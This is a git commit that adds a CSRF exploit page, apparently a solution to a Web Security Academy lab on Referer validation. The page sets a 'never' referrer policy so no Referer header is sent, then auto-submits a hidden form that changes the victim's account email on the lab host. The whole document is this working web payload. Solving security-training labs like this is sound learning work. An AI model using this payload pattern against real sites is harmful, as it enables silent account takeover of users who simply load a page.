f62a57c96066de8044aec4924e1489bdfbb5bc80
Pranjal <pranjalruhela2811@gmail.com>
2023-06-29 12:51:12 +0530

    omitted token

---
+++ CSRF/CSRF where Referer validation depends on header being present/payload.js
@@ -0,0 +1,11 @@
+<html>
+    <head><meta name="referrer" content="never"/></head>
+    <body>
+        <form action = "https://0a77006003edda5c80becbef000b004d.web-security-academy.net/my-account/change-email" method = "POST">
+            <input type="hidden" name="email" value="hactgube@ff.net"/>
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
